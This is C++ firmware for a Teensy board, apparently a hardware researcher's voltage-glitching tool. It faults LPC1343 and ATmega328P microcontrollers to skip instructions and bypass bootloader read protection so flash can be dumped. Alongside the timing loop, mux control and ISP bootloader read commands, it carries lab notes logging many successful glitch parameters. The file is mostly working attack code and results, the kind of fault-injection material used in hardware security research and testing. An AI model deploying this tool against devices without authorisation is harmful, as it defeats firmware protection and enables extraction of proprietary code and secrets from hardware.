/*
 * Entirely non-invasive Teensy-based (3.x, 4.0) Voltage Glitcher
 * for bypassing instructions & bootloader protection for flash dumping
 * Tested on LPC1343 & ATmega328P
 *
 * -samy kamkar, 2019/10/14
 *
 * Upon mux'ing to glitch voltage level, glitch side sinks current
 * from target device (bypass caps & MCU) via variable capacitance +
 * resistance, depleting it enough to allow proper instruction skipping.
 *
 * It's likely that if bypass capacitors were removed from target,
 * the attack would simply happen "slightly later"
 *
 * Simplest setup uses MAX4619 + 10uF cap on Y1
 */

/*
questions
- why does voltage supply set to 0.0 help
- does resistor + cap help? is bigger cap better?
- should i mux resistor across cap only when not glitching?
- hwy does bench supply voltage randomly fluctuate?

   s16500
  g = glitch
  r = reset glitch
  s# = start delay (start_delay_us 0)
  w# = wait after glitch before check for success (wait_for_glitch_us 300)
  p# = wait after power off target (power_off_us 400)
  n# = num of nops (nops 10)

teensy 3.2 @ 72MHz

-- board with ALL CAPS! --
3.0V 0.0V 470uF electrolytic
21ns nop?
note 0.0v still had bench supply connected, just set to 0.0v
Woot! Glitched at 311 us delay, 16500 us start delay, 100 nops
Woot! Glitched at 2759 us delay, 16500 us start delay, 100 nops
Woot! Glitched at 4878 us delay, 16500 us start delay, 100 nops

FULLY WORKING
2.9/3.0V 0.0V 470uF electrolytic
note 0.0v still had bench supply connected, just set to 0.0v
Woot! Success: Glitching with 1582+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 1630+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 3312+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 3446+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 3557+0 us delay, 1000 wait us, 500 off us, 60 nops

FULLY WORKING
2.9/3.0V 0.0V 1Ohm resistor+470uF electrolytic
note 0.0v still had bench supply connected, just set to 0.0v
Woot! Success: Glitching with 1468+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 1609+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 1898+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 1915+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 1957+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 2336+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 2699+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 2769+0 us delay, 1000 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 3638+0 us delay, 1000 wait us, 500 off us, 60 nops

Woot! Success: Glitching with 819+0 us delay, 20 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 835+0 us delay, 20 wait us, 500 off us, 60 nops
Woot! Success: Glitching with 3432+0 us delay, 20 wait us, 500 off us, 60 nops

Woot! Success: Glitching with 2428+0 us delay, 20 wait us, 50 off us, 60 nops
Woot! Success: Glitching with 3572+0 us delay, 20 wait us, 50 off us, 60 nops
Woot! Success: Glitching with 5850+0 us delay, 20 wait us, 50 off us, 60 nops
Woot! Success: Glitching with 6807+0 us delay, 20 wait us, 50 off us, 60 nops
Woot! Success: Glitching with 7316+0 us delay, 20 wait us, 50 off us, 60 nops
Woot! Success: Glitching with 8861+0 us delay, 20 wait us, 50 off us, 60 nops

-- WEIRD --
these glitch but led stays static, doesn't blink - only diff is 70x60 nops
Woot! Success: Glitching with 1446+0 us delay, 20 wait us, 50 off us, 70 nops
Woot! Success: Glitching with 2179+0 us delay, 20 wait us, 50 off us, 70 nops
Woot! Success: Glitching with 2233+0 us delay, 20 wait us, 50 off us, 70 nops
Woot! Success: Glitching with 2829+0 us delay, 20 wait us, 50 off us, 70 nops
Woot! Success: Glitching with 3204+0 us delay, 20 wait us, 50 off us, 70 nops
Woot! Success: Glitching with 3261+0 us delay, 20 wait us, 50 off us, 70 nops
-----------------

3.0V 0.0V 1Ohm resistor
Woot! Glitched at 650 us delay, 0 us start delay, 100 nops
Woot! Glitched at 4150 us delay, 0 us start delay, 100 nops
Woot! Glitched at 4219 us delay, 0 us start delay, 100 nops
Woot! Glitched at 4247 us delay, 0 us start delay, 100 nops
Woot! Glitched at 4459 us delay, 0 us start delay, 100 nops
Woot! Glitched at 4647 us delay, 0 us start delay, 100 nops
Woot! Glitched at 5232 us delay, 0 us start delay, 100 nops
Woot! Glitched at 5372 us delay, 0 us start delay, 100 nops
Woot! Glitched at 5472 us delay, 0 us start delay, 100 nops
Woot! Glitched at 5960 us delay, 0 us start delay, 100 nops
Woot! Glitched at 8977 us delay, 0 us start delay, 100 nops
Woot! Glitched at 9119 us delay, 0 us start delay, 100 nops
Woot! Glitched at 9217 us delay, 0 us start delay, 100 nops

-- board with 3 100nF caps missing --
1.9V 0.6V small cap
Glitched at 4443 us delay, 2000 us start delay, 5 nops
Glitched at 4798 us delay, 2000 us start delay, 5 nops
Glitched at 3212 us delay, 2000 us start delay, 10 nops
Glitched at 5797 us delay, 2000 us start delay, 10 nops

3.3V 0.6V small cap
Glitched at 2717 us delay, 0 us start delay, 10 nops
Glitched at 3288 us delay, 0 us start delay, 10 nops
Glitched at 3661 us delay, 0 us start delay, 10 nops
Glitched at 3272 us delay, 0 us start delay, 5 nops
Glitched at 3813 us delay, 0 us start delay, 5 nops
Glitched at 4000 us delay, 0 us start delay, 5 nops
Glitched at 7807 us delay, 0 us start delay, 5 nops
Glitched at 10108 us delay, 0 us start delay, 5 nops
Glitched at 2879 us delay, 0 us start delay, 2 nops
Glitched at 3595 us delay, 0 us start delay, 2 nops
*/

/*
TODO:
  DONE - remove cap from target
  DONE? - remove extra wires from max - i think this slowed things down, re-added
  add reset control to lpc board or see if we can float mux output
  fix teensy mon pmon
  figure out how long to glitch for (~250us seems good)
  add variable voltage level from DAC
  test using caps to deplete target power without removing target cap
  work on bp bypass
  IGNORE - switch to digitalreadfast - not necessary, moved it to post-glitch

  2019/10/27
  -samy kamkar
 */

#define SERIAL_RX_PIN 0
#define SERIAL_TX_PIN 1
#define Target Serial1
#define TARGET_PIN 4 // PIO1_4 on target
#define START_PIN 5 // PIO1_0 on target
#define RESET_PIN 12

#define MUX_ENABLE_PIN 2
#define MUX_CONTROL_PIN 3
#define DAC_PIN 14
#define LED_PIN 13

#define v_normal() digitalWriteFast(MUX_CONTROL_PIN, 1)
#define v_glitch()  digitalWriteFast(MUX_CONTROL_PIN, 0)

#define enable_mux() digitalWriteFast(MUX_ENABLE_PIN, 0)
#define disable_mux() digitalWriteFast(MUX_ENABLE_PIN, 1)

#define enable_target() digitalWriteFast(RESET_PIN, 1)
#define disable_target() digitalWriteFast(RESET_PIN, 0)

volatile bool target_running = true;

bool should_reset = false;
bool rand_vals = false;
long nops = 10;
long start_delay_us = 0;
long wait_for_glitch_us = 1000;
long power_off_us = 500;

// ISR
void target_status()
{
  target_running = digitalReadFast(START_PIN);
}

void setup()
{
  pinMode(MUX_ENABLE_PIN, OUTPUT);
  pinMode(MUX_CONTROL_PIN, OUTPUT);
  pinMode(LED_PIN, OUTPUT);
  pinMode(TARGET_PIN, INPUT);
  pinMode(START_PIN, INPUT);
  pinMode(RESET_PIN, OUTPUT);


  //attachInterrupt(digitalPinToInterrupt(START_PIN), target_status, CHANGE);

  v_normal(); // normal voltage for lpc chip
  enable_mux(); // enable mux
  enable_target(); // enable lpc chip

  // open serial
  Serial.begin(115200);
  //Serial.setTimeout(5);

  delay(500);
  Target.begin(115200);

  delay(100);
}

void loop()
{
  run_glitch();
  handleInput(0);
}

void handleInput(long ms)
{
  long until = millis() + ms;
  do
  {
    if (Serial.available())
    {
      char opt = Serial.read();
      if (opt == '\r' || opt == '\n') continue;

      digitalWrite(LED_PIN, 1);
      delay(200);
      digitalWrite(LED_PIN, 0);

      // glitch
      if (opt == 'g')
      {
        Serial.printf("Running glitch\n");
        run_glitch();
      }
      // random
      else if (opt == 'R')
      {
        rand_vals = !rand_vals;
        Serial.printf("Turned randomness %s\n", rand_vals ? "on" : "off");
      }
      // set nops
      else if (opt == 'n')
      {
        nops = Serial.parseInt();
        if (nops == 0) nops = 1;
        Serial.printf("Changed nops to %d\n", nops);
      }
      // set start delay (us)
      else if (opt == 's')
      {
        start_delay_us = Serial.parseInt();
        Serial.printf("Changed start delay (us) to %d\n", start_delay_us);
      }
      else if (opt == 'r')
      {
        Serial.printf("Resetting glitch\n");
        should_reset = 1;
      }
      else if (opt == 'p')
      {
        power_off_us = Serial.parseInt();
        Serial.printf("Changed wait (us) after powering off target to %d\n", power_off_us);
      }
      else if (opt == 'w')
      {
        wait_for_glitch_us = Serial.parseInt();
        Serial.printf("Changed wait (us) after glitch before checking success to %d\n", wait_for_glitch_us);
      }
    }
  } while (millis() < until);
  //boot(); delay(1000);
}

#define GLITCH_DELAY_US 1
#define PrintGlitch() Serial.printf("Glitching with %d+%d us delay, %d wait us, %d off us, %d nops\n", us, start_delay_us, wait_for_glitch_us, power_off_us, nops)
void run_glitch()
{
  Serial.printf("Target pin: %d\n", digitalRead(TARGET_PIN));

  long us = 0;
  bool glitch_output;

  do {
    digitalWrite(LED_PIN, 1);
    if (rand_vals)
    {
      us = random(0, 20000);
      nops = random(0, 300);
    }
    glitch_output = glitch(us);
    if (glitch_output)
    {
      Serial.printf("Woot! Success: ");
      PrintGlitch();
      //Serial.printf("\nWoot! Glitched at %d us delay, %d us start delay, %d nops\n\n\n", us, start_delay_us, nops);
      delay_for_key(10000);
    }
    digitalWrite(LED_PIN, 0);
    glitch_off(); // disable power to target

    us += 1;
    if (us % 50 == 0)
    {
      handleInput(0);
      PrintGlitch();
      //Serial.printf("Glitching with %d+%d us delay, %d wait us, %d off us, %d nops\n", us, start_delay_us, wait_for_glitch_us, power_off_us, nops);

      if (should_reset)
      {
        //Serial.printf("Last glitch at %d us delay, %d us start delay, %d nops\n", us, start_delay_us, nops);
        should_reset = 0;
        return;
      }
    }
  } while (1);

  //Serial.printf("Woot! Glitched at %d us delay, %d us start delay, %d nops\n", us, start_delay_us, nops);
  //Serial.printf("Target pin: %d\n\n", digitalRead(TARGET_PIN));
}

#define nop() __asm__ volatile ("nop")

long usnow, usstart;

// set voltage normal, then check if chip reset
inline void normal_check()
{
  v_normal();

  /*
  // ack!
  if (target_running == false)
  {
    Serial.printf("target down!\n");
  }
  */
}

bool glitch(long us)
{
  long nop_instructions = nops/2;
  long init_delay = us + start_delay_us;

  // delayNops doesn't handle when nops is 0-2 so handle manually
  if (nops == 0)
  {
    startGlitch(init_delay);
    normal_check();
  }
  else if (nops == 1)
  {
    startGlitch(init_delay);
    nop();
    normal_check();
  }
  else if (nops == 2)
  {
    startGlitch(init_delay);
    nop();
    nop();
    normal_check();
  }
  else if ((nops % 2) == 1)
  {
    startGlitch(init_delay);
    nop();
    delayNops(nop_instructions);
    normal_check();
  }
  else
  {
    startGlitch(init_delay);
    delayNops(nop_instructions);
    normal_check();
  }

  delayMicroseconds(wait_for_glitch_us);
  //bool ret = digitalReadFast(TARGET_PIN);
  bool ret = digitalReadFast(TARGET_PIN) & !digitalReadFast(START_PIN);

  // if glitch happens, target pin will be high
  return ret;
}

void resetTarget()
{
  disable_target();
  delayMicroseconds(1);
  enable_target();
}

inline void while_timeout(int pin, bool truth, long us)
{
  long until = micros() + us;
  while (micros() < until)
  {
    if (truth ^ digitalReadFast(pin))
      return;
    /*
    if (truth & !digitalReadFast(pin))
      return;
    if (!truth & digitalReadFast(pin))
      return;
      */
  }
}

inline void startGlitch(long init_delay)
{
  // power target, wait for our delay
  enable_target();

  // make sure glitch pin is low (high is successful glitch condition)
  while_timeout(TARGET_PIN, true, 1000);
  while_timeout(START_PIN, false, 1000);
  //while (digitalReadFast(TARGET_PIN));
  //while (!digitalReadFast(START_PIN));

  delayMicroseconds(init_delay);

  // glitch for a moment
  v_glitch();
}

void glitch_off()
{
  // disable power to target, set normal voltage level
  disable_target();
  v_normal();

  //disable_mux();
  delayMicroseconds(power_off_us);
}

inline void delayNops(long nops)
{
  __asm__ volatile(
  "L_%=_delayNops:"   "\n\t"
#ifdef KINETISL
    "sub    %0, #1"       "\n\t"
#else
    "subs   %0, #1"       "\n\t"
#endif
    "bne    L_%=_delayNops"   "\n"
    : "+r" (nops) :
  );
}

void boot()
{
  cmd("?");
  cmd("Synchronized");
  cmd("12000");
  cmd("R 0 4");
}

int cmd(char *str)
{
  Serial.printf("> writing %s\r\n", str);

  Target.printf("%s\r\n", str);
  char byte;

#define SERIAL_TIMEOUT_MS 300
  long delayms = millis() + SERIAL_TIMEOUT_MS;
  while (millis() < delayms)
  {
    if (Target.available())
    {
      byte = Target.read();
      Serial.printf("%c", byte);
    }
  }

  return 0;
}

char delay_for_key(long ms)
{
  long until = millis() + ms;
  while (millis() < until)
  {
    if (Serial.available())
    {
      char byte = Serial.read();
      if (byte == 's')
        wait_for_key('s');
      else
        return Serial.read();
    }
  }
  return 0;
}

// wait until a specific key is pressed
char wait_for_key(char expect)
{
  char byte;
  Serial.printf("Waiting for key: %c\n", expect);

  while (1)
  {
    if (Serial.available())
    {
      byte = Serial.read();
      if (byte == expect)
        return byte;
    }
  }
}